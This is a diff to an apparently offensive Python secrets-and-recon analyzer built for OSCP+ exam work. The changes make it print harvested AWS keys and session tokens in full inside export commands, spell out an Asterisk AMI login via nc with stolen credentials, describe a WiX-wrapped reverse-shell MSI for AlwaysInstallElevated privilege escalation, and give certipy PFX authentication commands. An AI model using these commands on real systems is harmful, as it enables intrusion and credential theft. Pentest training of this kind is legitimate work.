@@ -894,10 +894,13 @@ def _multiline_passes(path, report, store):
         ctx_end = min(len(text), m.end() + 2048)
         if not _IMDS_CONTEXT.search(text[ctx_start:ctx_end]):
             continue
+        # iter-16: was emitting literal '<sak>' / '<tok>' placeholders even
+        # though we already captured the values. Use them directly.
         report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                    f"AWS STS creds (IMDS): AccessKeyId={akid}",
-                   hint=(f"export AWS_ACCESS_KEY_ID={akid}; export AWS_SECRET_ACCESS_KEY=<sak>; "
-                         + ("export AWS_SESSION_TOKEN=<tok>; " if tok else "")
+                   hint=(f"export AWS_ACCESS_KEY_ID={akid}; "
+                         f"export AWS_SECRET_ACCESS_KEY={sak}; "
+                         + (f"export AWS_SESSION_TOKEN={tok}; " if tok else "")
                          + "aws sts get-caller-identity"))
         report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                    f"AWS Secret Access Key (IMDS): {sak[:8]}{'*'*(len(sak)-8)}",
@@ -1519,7 +1522,9 @@ def analyze(path, report, store=None):
                         u, p = am.group(1), am.group(2)
                         report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                    f"asterisk manager.conf [{u}]: secret={p}",
-                                   hint=f"asterisk AMI: nc <host> 5038; then Action: Login user:{u} secret:{p}")
+                                   hint=(f"asterisk AMI: nc <host> 5038; then send (CRLF-terminated): "
+                                         f"'Action: Login\\r\\nUsername: {u}\\r\\nSecret: {p}\\r\\n\\r\\n'   "
+                                         "(AMI keys are Username/Secret, not user/secret; CRLF mandatory)"))
                         if store is not None:
                             from analyzers.ingest.evidence import Evidence
                             store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
@@ -1654,9 +1659,17 @@ def analyze(path, report, store=None):
                         hit = True
                         break
                     if name == "AlwaysInstallElevated":
+                        # iter-16: replaced msfvenom hint - msfvenom-generated
+                        # payloads DO count toward the OSCP+ 1-target Metasploit
+                        # quota even when run locally. Prefer non-MSF MSI gen so
+                        # the AlwaysInstallElevated privesc costs zero MSF budget.
                         report.add("CRITICAL", "RECON", path, lineno,
                                    "AlwaysInstallElevated = 1 (SYSTEM via MSI)",
-                                   hint="msfvenom -p windows/x64/shell_reverse_tcp LHOST=<you> LPORT=<p> -f msi -o evil.msi; msiexec /quiet /qn /i evil.msi  (NOTE: msi exec is exam-legal; msfvenom is local payload gen, not target-side metasploit)")
+                                   hint=("non-MSF MSI: WiX (candle+light) wrapping a PowerShell/nim/Go "
+                                         "reverse shell; OR write a small C# Installer-class .msi. "
+                                         "Then: msiexec /quiet /qn /i evil.msi   "
+                                         "(spends 0 MSF budget; msfvenom-generated payloads count toward "
+                                         "the 1-target OSCP+ Metasploit limit)"))
                         hit = True
                         break
                     if name == "Snaffler red":
@@ -2016,7 +2029,7 @@ def analyze(path, report, store=None):
                             continue
                         report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                    f"PFX cert password: {pw}",
-                                   hint=f"openssl pkcs12 -in <file> -nodes -password pass:'{pw}'  - extract key; certipy auth -pfx <out> -p '{pw}'")
+                                   hint=f"openssl pkcs12 -in <file> -nodes -password pass:'{pw}'  - extract key; certipy auth -pfx <out> -password '{pw}'")
                         if store is not None:
                             from analyzers.ingest.evidence import Evidence
                             store.add(Evidence(kind="plaintext", plaintext=pw,
